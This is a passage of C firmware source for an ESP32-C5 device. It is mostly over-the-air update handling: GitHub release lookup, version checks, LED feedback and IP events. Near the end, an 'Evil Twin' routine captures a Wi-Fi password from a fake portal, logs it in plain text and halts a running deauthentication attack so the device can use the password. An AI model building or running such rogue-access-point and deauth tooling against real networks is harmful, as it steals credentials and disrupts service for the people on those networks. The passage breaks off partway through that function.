brokali/projectZeroTouch/ESP32C5/main/main.c
    err = esp_https_ota_finish(ota_handle);
    if (err != ESP_OK) {
        MY_LOG_INFO(TAG, "OTA: finish failed: %s", esp_err_to_name(err));
        return err;
    }

    return ESP_OK;
}

static bool ota_has_ip(void) {
    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!sta_netif) {
        return false;
    }

    esp_netif_ip_info_t ip_info;
    if (esp_netif_get_ip_info(sta_netif, &ip_info) != ESP_OK) {
        return false;
    }

    return ip_info.ip.addr != 0;
}

static bool ota_is_connected(void) {
    wifi_ap_record_t ap_info;
    if (esp_wifi_sta_get_ap_info(&ap_info) != ESP_OK) {
        return false;
    }
    return ota_has_ip();
}

static void ota_led_task(void *pvParameters) {
    (void)pvParameters;
    if (!led_initialized) {
        vTaskDelete(NULL);
        return;
    }

    const int step = 15;
    while (ota_led_active) {
        for (int level = 0; level <= 255 && ota_led_active; level += step) {
            led_set_color((uint8_t)level, 0, 0);
            vTaskDelay(pdMS_TO_TICKS(30));
        }
        for (int level = 255; level >= 0 && ota_led_active; level -= step) {
            led_set_color((uint8_t)level, 0, 0);
            vTaskDelay(pdMS_TO_TICKS(30));
        }
    }

    led_set_idle();
    ota_led_task_handle = NULL;
    vTaskDelete(NULL);
}

static void ota_led_start(void) {
    if (ota_led_task_handle != NULL || !led_initialized) {
        return;
    }

    ota_led_active = true;
    BaseType_t ok = xTaskCreate(ota_led_task, "ota_led", 2048, NULL, 3, &ota_led_task_handle);
    if (ok != pdPASS) {
        ota_led_task_handle = NULL;
        ota_led_active = false;
    }
}

static void ota_led_stop(void) {
    if (ota_led_task_handle == NULL) {
        return;
    }
    ota_led_active = false;
}

typedef struct {
    char tag[64];
    bool use_tag;
    bool force_latest;
} ota_check_args_t;

static bool ota_start_check(const char *tag, bool force_latest) {
    if (!ota_is_connected()) {
        MY_LOG_INFO(TAG, "OTA: not connected or no IP, skipping");
        return false;
    }
    if (ota_check_in_progress) {
        MY_LOG_INFO(TAG, "OTA: check already in progress");
        return false;
    }

    ota_check_in_progress = true;
    ota_check_args_t *args = calloc(1, sizeof(*args));
    if (!args) {
        ota_check_in_progress = false;
        MY_LOG_INFO(TAG, "OTA: out of memory");
        return false;
    }

    if (tag && *tag) {
        snprintf(args->tag, sizeof(args->tag), "%s", tag);
        args->use_tag = true;
    }
    args->force_latest = force_latest;

    BaseType_t task_ok = xTaskCreate(ota_check_task, "ota_check",
                                     OTA_TASK_STACK_SIZE, args,
                                     OTA_TASK_PRIORITY, NULL);
    if (task_ok != pdPASS) {
        free(args);
        ota_check_in_progress = false;
        MY_LOG_INFO(TAG, "OTA: failed to start check task");
        return false;
    }

    return true;
}

static void ota_check_task(void *pvParameters) {
    ota_check_args_t *args = (ota_check_args_t *)pvParameters;
    if (!ota_is_connected()) {
        MY_LOG_INFO(TAG, "OTA: not connected or no IP, aborting");
        ota_check_in_progress = false;
        free(args);
        vTaskDelete(NULL);
        return;
    }

    if (strcmp(OTA_GITHUB_OWNER, "your-org") == 0 ||
        strcmp(OTA_GITHUB_REPO, "your-repo") == 0 ||
        strcmp(OTA_ASSET_NAME, "firmware.bin") == 0) {
        MY_LOG_INFO(TAG, "OTA: config not set, skipping update");
        ota_check_in_progress = false;
        vTaskDelete(NULL);
        return;
    }

    char latest_tag[64] = {0};
    char download_url[256] = {0};
    esp_err_t err = ESP_OK;
    bool skip_version_check = false;
    if (args && args->use_tag) {
        err = ota_fetch_release_by_tag(args->tag, download_url, sizeof(download_url),
                                       latest_tag, sizeof(latest_tag));
    } else if (args && args->force_latest) {
        err = ota_fetch_latest_release(download_url, sizeof(download_url),
                                       latest_tag, sizeof(latest_tag));
    } else if (strcmp(ota_channel, "dev") == 0) {
        err = ota_build_branch_url(download_url, sizeof(download_url));
        if (err == ESP_OK) {
            snprintf(latest_tag, sizeof(latest_tag), "branch:%s", OTA_DEV_BRANCH);
            skip_version_check = true;
            MY_LOG_INFO(TAG, "OTA: dev channel uses branch '%s'", OTA_DEV_BRANCH);
            MY_LOG_INFO(TAG, "OTA: branch url=%s", download_url);
        }
    } else {
        err = ota_fetch_latest_release(download_url, sizeof(download_url),
                                       latest_tag, sizeof(latest_tag));
    }
    if (err != ESP_OK) {
        MY_LOG_INFO(TAG, "OTA: failed to fetch release info: %s", esp_err_to_name(err));
        ota_check_in_progress = false;
        free(args);
        vTaskDelete(NULL);
        return;
    }

    if (!skip_version_check && !(args && args->use_tag) &&
        !ota_is_newer_version(JANOS_VERSION, latest_tag)) {
        MY_LOG_INFO(TAG, "OTA: no update (current=%s, latest=%s)", JANOS_VERSION, latest_tag);
        ota_check_in_progress = false;
        free(args);
        vTaskDelete(NULL);
        return;
    }

    MY_LOG_INFO(TAG, "OTA: current=%s, target=%s", JANOS_VERSION, latest_tag);
    MY_LOG_INFO(TAG, "OTA: updating to %s", latest_tag);
    const esp_partition_t *target_part = esp_ota_get_next_update_partition(NULL);
    MY_LOG_INFO(TAG, "OTA: target partition=%s offset=0x%lx",
                target_part ? target_part->label : "n/a",
                target_part ? (unsigned long)target_part->address : 0UL);
    ota_led_start();
    err = ota_perform_https_update(download_url);
    ota_led_stop();
    if (err == ESP_OK) {
        MY_LOG_INFO(TAG, "OTA: update applied, restarting");
        ota_check_in_progress = false;
        free(args);
        safe_restart();  // unmount SD card before restart
    } else {
        MY_LOG_INFO(TAG, "OTA: update failed: %s", esp_err_to_name(err));
    }

    ota_check_in_progress = false;
    free(args);
    vTaskDelete(NULL);
}

static void ip_event_handler(void *event_handler_arg,
                             esp_event_base_t event_base,
                             int32_t event_id,
                             void *event_data) {
    (void)event_handler_arg;
    (void)event_data;

    if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
        if (capture_gateway_is_active()) {
            esp_err_t err = capture_gateway_refresh_upstream();
            if (err == ESP_OK) {
                MY_LOG_INFO(TAG, "Capture Gateway: upstream IPv4 and DNS refreshed");
            } else {
                MY_LOG_INFO(TAG, "Capture Gateway: upstream refresh failed: %s",
                            esp_err_to_name(err));
            }
        }
        if (ota_auto_on_ip && !ota_check_started) {
            if (ota_start_check(NULL, false)) {
                ota_check_started = true;
            }
        }
    }
}

// --- Password verification function (used by portal) ---
static void verify_password(const char* password) {
    evilTwinPassword = malloc(strlen(password) + 1);
    if (evilTwinPassword != NULL) {
        strcpy(evilTwinPassword, password);
    } else {
        ESP_LOGW(TAG,"Malloc error for password");
    }

    MY_LOG_INFO(TAG, "Password received: %s", password);

    {
        char et_l2[64];
        snprintf(et_l2, sizeof(et_l2), ">> %s", evilTwinSSID ? evilTwinSSID : "?");
        oled_display_update_full("> Evil Twin", et_l2, "  Got password!", "  Verifying...");
    }

    // Stop deauth attack BEFORE attempting to connect
    // This is crucial because deauth task switches channels which prevents stable STA connection
    if (deauth_attack_active || deauth_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Stopping deauth attack to attempt connection...");
        deauth_attack_active = false;
        
